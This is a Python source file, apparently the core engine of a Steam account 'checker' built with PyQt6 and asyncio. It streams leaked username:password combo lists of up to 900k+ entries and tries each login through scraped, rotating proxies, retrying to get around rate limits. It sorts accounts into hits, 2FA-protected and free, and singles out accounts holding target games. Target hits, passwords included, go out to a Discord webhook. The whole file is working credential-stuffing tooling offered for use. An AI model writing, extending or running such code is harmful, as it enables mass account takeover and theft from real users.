"""
Asynchronous Execution Engine and Task Orchestrator
Integrates PyQt6 QThread lifecycle with non-blocking asyncio worker pools.
"""

import time
import json
import asyncio
from pathlib import Path
from typing import List, Dict, Any, Optional, Union
import aiohttp
from PyQt6.QtCore import QThread, pyqtSignal

from nexus.config import (
    DEFAULT_CONCURRENCY, DEFAULT_TIMEOUT_SEC, DEFAULT_MAX_RETRIES,
    CHECKPOINT_FILE, DISCORD_WEBHOOK_URL, PROXIES_FILE
)
from nexus.core.validator import validate_credential_tuple, parse_credential_line, stream_credential_tuples
from nexus.core.proxy_pool import NetworkRelayPool, NetworkRelay, continuous_watchdog_loop
from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_proxies
from nexus.core.transport import SessionTransportPool
from nexus.utils.exporter import ResultExporter
from nexus.utils.discord import DiscordWebhookDispatcher
from nexus.utils.targets import evaluate_target_account


class ValidationEngine(QThread):
    """
    Background worker thread executing asynchronous verification routines.
    Emits reactive Qt signals to the UI without UI thread blocking.
    Integrates streaming iterators for 900k+ account batches and real-time Discord webhook alerts.
    """
    item_checked = pyqtSignal(dict)
    stats_updated = pyqtSignal(dict)
    progress_updated = pyqtSignal(int, int)
    log_emitted = pyqtSignal(str, str)
    status_changed = pyqtSignal(str)
    engine_finished = pyqtSignal()

    def __init__(
        self,
        combos: Union[List[str], str, Path],
        relay_pool: Optional[NetworkRelayPool] = None,
        concurrency: int = DEFAULT_CONCURRENCY,
        timeout: int = DEFAULT_TIMEOUT_SEC,
        max_retries: int = DEFAULT_MAX_RETRIES,
        exporter: Optional[ResultExporter] = None,
        total_count_override: Optional[int] = None,
        webhook_url: Optional[str] = None,
        resume_checkpoint: bool = False
    ):
        super().__init__()
        self.combos = combos
        self.relay_pool = relay_pool
        self.concurrency = max(1, concurrency)
        self.timeout = timeout
        self.max_retries = max_retries
        self.exporter = exporter or ResultExporter()
        self.webhook_url = webhook_url if webhook_url is not None else DISCORD_WEBHOOK_URL
        self.discord_dispatcher: Optional[DiscordWebhookDispatcher] = None
        if self.webhook_url and self.webhook_url.startswith("http"):
            self.discord_dispatcher = DiscordWebhookDispatcher(self.webhook_url)

        self.transport_pool = SessionTransportPool(pool_limit=max(150, self.concurrency * 2))

        self._is_running = False
        self._is_paused = False
        self._pause_event: Optional[asyncio.Event] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._watchdog_task: Optional[asyncio.Task] = None
        self._watchdog_stop_event: Optional[asyncio.Event] = None
        self._is_replenishing_proxies: bool = False

        # Resume / Checkpoint
        self.skip_to_index = 0
        if resume_checkpoint and CHECKPOINT_FILE.exists():
            try:
                with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                    cp = json.load(f)
                    self.skip_to_index = cp.get("checked", 0)
            except Exception:
                pass

        # Telemetry Metrics (supports 900k+ high-scale batches)
        if total_count_override is not None:
            self.total_count = total_count_override
        elif isinstance(combos, (list, tuple)):
            self.total_count = len(combos)
        else:
            self.total_count = 0

        self.checked_count = self.skip_to_index
        self.target_hit_count = 0
        self.hit_count = 0
        self.free_count = 0
        self.invalid_count = 0
        self.two_fa_count = 0
        self.error_count = 0
        self.start_time = 0.0
        self._last_stats_emit = 0.0

    def _save_checkpoint(self):
        """Persists current state atomically to checkpoint.json to prevent corruption on abrupt termination."""
        try:
            state = {
                "checked": self.checked_count,
                "total": self.total_count,
                "target_hits": self.target_hit_count,
                "hits": self.hit_count,
                "two_fa": self.two_fa_count,
                "timestamp": time.time(),
            }
            tmp_file = CHECKPOINT_FILE.with_suffix(".tmp")
            with open(tmp_file, "w", encoding="utf-8") as f:
                json.dump(state, f, indent=2)
            tmp_file.replace(CHECKPOINT_FILE)
        except Exception:
            pass

    def pause(self):
        """Pauses processing across all active workers."""
        if self._is_running and not self._is_paused:
            self._is_paused = True
            if self._pause_event and self._loop:
                self._loop.call_soon_threadsafe(self._pause_event.clear)
            self.status_changed.emit("Paused")
            self.log_emitted.emit("Engine paused by operator.", "WARNING")

    def resume(self):
        """Resumes paused workers."""
        if self._is_running and self._is_paused:
            self._is_paused = False
            if self._pause_event and self._loop:
                self._loop.call_soon_threadsafe(self._pause_event.set)
            self.status_changed.emit("Running")
            self.log_emitted.emit("Engine resumed operations.", "INFO")

    def stop(self):
        """Signals engine to gracefully abort processing."""
        self._is_running = False
        if self._pause_event and self._loop:
            self._loop.call_soon_threadsafe(self._pause_event.set)
        self.status_changed.emit("Stopping...")
        self.log_emitted.emit("Stop signal received. Terminating workers...", "WARNING")

    def run(self):
        """Entry point for QThread execution."""
        self._is_running = True
        self.start_time = time.time()
        self.log_emitted.emit(
            f"High-Scale Validation Engine initialized. Total accounts: {self.total_count:,} | Workers: {self.concurrency}",
            "INFO"
        )
        self.status_changed.emit("RUNNING")

        # Initialize event loop for this thread
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)

        try:
            self._loop.run_until_complete(self._orchestrate_async_pipeline())
        except Exception as err:
            self.log_emitted.emit(f"Critical execution fault: {err}", "ERROR")
        finally:
            self._loop.close()
            self._is_running = False
            self.status_changed.emit("IDLE")
            self.log_emitted.emit(
                f"Batch execution finalized. Verified: {self.checked_count:,}/{self.total_count:,} | Hits: {self.hit_count:,} (2FA: {self.two_fa_count:,})",
                "SUCCESS"
            )
            self.engine_finished.emit()

    async def _replenish_relays_background(self):
        """Auto-triggers fresh relay harvest and viability filtering when pool is low."""
        if self._is_replenishing_proxies or not self.relay_pool:
            return
        self._is_replenishing_proxies = True
        try:
            cur_active = self.relay_pool.active_count
            self.log_emitted.emit(
                f"[PROXY SHIELD] Active relays dipped to {cur_active}. Scraping fresh nodes across 50+ repositories...",
                "INFO"
            )
            raw_scraped = await scrape_fresh_proxies(max_relays=2500)
            if raw_scraped:
                operational = await filter_operational_proxies(
                    raw_scraped,
                    concurrency=75,
                    timeout_sec=4,
                    save_to_file=True
                )
                if operational:
                    added = self.relay_pool.append_relays(operational)
                    self.log_emitted.emit(
                        f"[PROXY SHIELD] Successfully injected +{added} live proxies into pool. Total Active Relays: {self.relay_pool.active_count}",
                        "SUCCESS"
                    )
        except Exception as e:
            self.log_emitted.emit(f"[PROXY SHIELD] Auto-replenishment notice: {e}", "WARNING")
        finally:
            self._is_replenishing_proxies = False

    async def _orchestrate_async_pipeline(self):
        """
        Memory-efficient pipeline designed for 900k+ account batches.
        Uses a bounded buffer queue to avoid loading millions of parsed objects into RAM simultaneously.
        """
        self._pause_event = asyncio.Event()
        self._pause_event.set()

        # Bounded queue prevents memory spikes on 900k+ lists
        queue_max_size = min(50000, max(2000, self.concurrency * 100))
        queue: asyncio.Queue = asyncio.Queue(maxsize=queue_max_size)

        semaphore = asyncio.Semaphore(self.concurrency)

        # Launch real-time proxy watchdog if pool is active
        if self.relay_pool and self.relay_pool.total > 0:
            self._watchdog_stop_event = asyncio.Event()
            self._watchdog_task = asyncio.create_task(
                continuous_watchdog_loop(
                    pool=self.relay_pool,
                    stop_event=self._watchdog_stop_event,
                    interval_seconds=10,
                    on_pool_depleted_callback=self._replenish_relays_background
                )
            )

        # Initialize Discord Webhook dispatcher
        if self.discord_dispatcher:
            await self.discord_dispatcher.start()

        async def _queue_producer():
            """Feeds accounts into bounded queue steadily with streaming generator and checkpoint skip."""
            line_idx = 0
            for user, pwd in stream_credential_tuples(self.combos):
                if not self._is_running:
                    break
                line_idx += 1
                if self.skip_to_index > 0 and line_idx <= self.skip_to_index:
                    continue

                await queue.put({
                    "index": line_idx,
                    "user": user,
                    "pass": pwd,
                    "retries": 0
                })

        producer_task = asyncio.create_task(_queue_producer())

        workers = [
            asyncio.create_task(self._worker_routine(queue, semaphore))
            for _ in range(self.concurrency)
        ]

        # Monitor loop
        while self._is_running:
            if producer_task.done() and queue.empty():
                await queue.join()
                break
            await asyncio.sleep(0.1)

        producer_task.cancel()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        if self._watchdog_stop_event:
            self._watchdog_stop_event.set()
        if self._watchdog_task:
            self._watchdog_task.cancel()

        if self.discord_dispatcher:
            await self.discord_dispatcher.stop()

        await self.transport_pool.close_all()

        # Emit final telemetry state and generate final batch report
        elapsed = max(0.001, time.time() - self.start_time)
        cpm = int((self.checked_count / elapsed) * 60)
        self.progress_updated.emit(self.checked_count, self.total_count)
        self.stats_updated.emit({
            "total": self.total_count,
            "checked": self.checked_count,
            "hits": self.hit_count,
            "target_hits": self.target_hit_count,
            "free": self.free_count,
            "invalid": self.invalid_count,
            "cpm": cpm,
            "elapsed": int(elapsed)
        })
        self._save_checkpoint()
        self.exporter.finalize_validation_batch(
            total_checked=self.checked_count,
            total_hits=self.hit_count,
            target_hits=self.target_hit_count,
            two_fa_count=self.two_fa_count,
            invalid_count=self.invalid_count,
            elapsed_sec=elapsed
        )

    async def _worker_routine(
        self,
        queue: asyncio.Queue,
        semaphore: asyncio.Semaphore
    ):
        """Individual worker pulling from queue and verifying credentials with persistent transport pool."""
        while self._is_running:
            # Check pause status
            if self._pause_event:
                await self._pause_event.wait()

            try:
                task_data = await asyncio.wait_for(queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                if queue.empty():
                    break
                continue
            except asyncio.CancelledError:
                break

            if not self._is_running:
                queue.task_done()
                break

            username = task_data["user"]
            password = task_data["pass"]
            retries = task_data["retries"]

            async with semaphore:
                result = None
                # Dynamically try up to 8 live proxies per account if network drops or rate-limits occur
                max_relay_tries = 8 if (self.relay_pool and self.relay_pool.total > 0) else 2

                for relay_try in range(max_relay_tries):
                    if not self._is_running:
                        break

                    relay: Optional[NetworkRelay] = None
                    if self.relay_pool and self.relay_pool.total > 0:
                        relay = await self.relay_pool.get_next_relay()

                    # Pacing delay if running on Direct Connection
                    if not relay:
                        await asyncio.sleep(0.8)

                    try:
                        session = await self.transport_pool.get_session(relay)
                        result = await validate_credential_tuple(
                            session=session,
                            username=username,
                            password=password,
                            relay=relay,
                            timeout=self.timeout
                        )
                    except Exception as net_err:
                        result = {
                            "account": f"{username}:{password}",
                            "username": username,
                            "password": password,
                            "status": "ERROR",
                            "steamid": "",
                            "persona_name": username,
                            "avatar_url": "",
                            "details": f"Network Exception: {type(net_err).__name__}",
                            "total_games": 0,
                            "paid_games": 0,
                            "games": [],
                            "vac_banned": False,
                            "trade_banned": False,
                            "is_limited": False,
                            "country": "🌐 Global",
                            "location": "",
                            "ping_ms": 0,
                            "proxy": relay.display_str if relay else "Direct",
                        }
                    finally:
                        if self.relay_pool and relay:
                            self.relay_pool.release_relay(relay)

                    status = result.get("status", "ERROR")

                    if relay:
                        if status == "RATE_LIMIT":
                            relay.mark_rate_limited(cooldown_seconds=180)
                            continue
                        elif status in ("PROXY_ERROR", "TIMEOUT", "ERROR"):
                            relay.mark_failure(severe=False)
                            continue

                    # Conclusive answer obtained (HIT, FREE, 2FA_HIT, INVALID)
                    break

                if not result:
                    result = {
                        "account": f"{username}:{password}",
                        "username": username,
                        "password": password,
                        "status": "ERROR",
                        "steamid": "",
                        "persona_name": username,
                        "avatar_url": "",
                        "details": "Connection Failed Across Relays",
                        "total_games": 0,
                        "paid_games": 0,
                        "games": [],
                        "vac_banned": False,
                        "trade_banned": False,
                        "is_limited": False,
                        "country": "🌐 Global",
                        "location": "",
                        "ping_ms": 0,
                        "proxy": "None",
                    }

                status = result["status"]

                # If still inconclusive after multiple proxy tries, requeue up to max_retries
                if status in ("RATE_LIMIT", "ERROR", "TIMEOUT", "PROXY_ERROR") and retries < self.max_retries and self._is_running:
                    task_data["retries"] += 1
                    if not relay and status == "RATE_LIMIT":
                        await asyncio.sleep(2.0)
                    await queue.put(task_data)
                    queue.task_done()
                    continue

                if relay and status in ("HIT", "FREE", "2FA_HIT", "INVALID"):
                    relay.mark_success(result.get("ping_ms", 100))

                # Process verified outcome
                self.checked_count += 1

                is_target, matched_targets = evaluate_target_account(result)
                if is_target:
                    result["matched_targets"] = matched_targets

                self.exporter.record_item_live(result)

                if status == "HIT":
                    self.hit_count += 1
                    if is_target:
                        self.target_hit_count += 1
                        self.exporter.record_target_hit(result, matched_targets)
                        self.log_emitted.emit(f"[🎯 TARGET HIT] {username} | {len(matched_targets)} Target Games", "SUCCESS")
                        if self.discord_dispatcher:
                            await self.discord_dispatcher.dispatch_hit(result)
                    else:
                        self.log_emitted.emit(f"[HIT] {username} | Games: {result['total_games']} (Paid)", "SUCCESS")
                elif status == "2FA_HIT":
                    self.two_fa_count += 1
                    self.log_emitted.emit(f"[HIT/2FA] {username} | SteamGuard Active", "WARNING")
                elif status == "FREE":
                    self.free_count += 1
                    self.log_emitted.emit(f"[FREE] {username} | Zero Library", "INFO")
                elif status == "INVALID":
                    self.invalid_count += 1
                else:
                    self.error_count += 1

                # Save checkpoint periodically (every 50 accounts)
                if self.checked_count % 50 == 0:
                    self._save_checkpoint()

                # Signal UI: Only emit table items for actionable events (HIT, 2FA, FREE) to prevent UI thread choking on 950k accounts
                if status in ("HIT", "2FA_HIT", "FREE"):
                    self.item_checked.emit(result)

                # Compute real-time CPM & throttle Qt signal emissions (max 5/sec) to keep GUI 100% fluid
                now = time.time()
                if (now - self._last_stats_emit >= 0.20) or (self.checked_count % 25 == 0):
                    self._last_stats_emit = now
                    elapsed = max(0.001, now - self.start_time)
                    cpm = int((self.checked_count / elapsed) * 60)
                    self.progress_updated.emit(self.checked_count, self.total_count)
                    self.stats_updated.emit({
                        "total": self.total_count,
                        "checked": self.checked_count,
                        "hits": self.hit_count,
                        "free": self.free_count,
                        "invalid": self.invalid_count,
                        "cpm": cpm,
                        "elapsed": int(elapsed)
                    })

                queue.task_done()
